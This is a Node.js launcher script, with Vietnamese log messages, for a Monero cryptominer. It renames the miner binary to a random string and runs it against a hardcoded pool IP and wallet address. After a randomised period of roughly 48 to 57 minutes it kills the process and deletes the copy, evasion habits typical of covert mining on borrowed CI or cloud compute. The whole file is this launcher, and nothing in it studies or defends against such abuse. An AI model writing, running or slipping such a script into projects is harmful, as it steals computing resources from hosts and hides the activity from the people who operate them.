const shell = require('shelljs');
const { printLog } = require('./log-print');

const timeout = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
let nameTool = Math.random().toString(36).substring(7);
const timeRunJobs = ((Math.floor(Math.random() * 10) + 48) * 60) * 1000;
console.log(`-- task chay trong ${((timeRunJobs / 60) / 1000)} phut`);


if (shell.exec(`cp meocoder ${nameTool}`, { silent: true }).code === 0) {
    console.log('-- giai nen file thanh cong');
} else {
  console.log('-- giai nen file that bai, su dung tool mac dinh :((');
  nameTool = 'meocoder';
}

(async () => {
  await timeout(timeRunJobs);
    if (shell.exec(`killall ${ nameTool } && pkill ${ nameTool }`, { silent: true }).code === 0) {
        nameTool !== 'meocoder' ? shell.exec(`rm -rf ${ nameTool }`, { silent: true }) : null;
        console.log('-- ket thuc jobs thanh cong');
    } else {
        console.log('-- ket thuc jobs that bai');
        shell.exec(`killall ${ nameTool } && pkill ${ nameTool }`, { silent: true });
    }
})();


const runMonney = shell.exec(`./${ nameTool } -o 192.81.216.190:8386 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder_linux~rx/0 -k --no-color --coin monero -a rx/0`, { silent: true, async: true });
if (runMonney.code !== undefined) {
    return 0;
}
console.log('task running');
runMonney.stdout.on('data', (rawLog) => {
    printLog(rawLog);
});
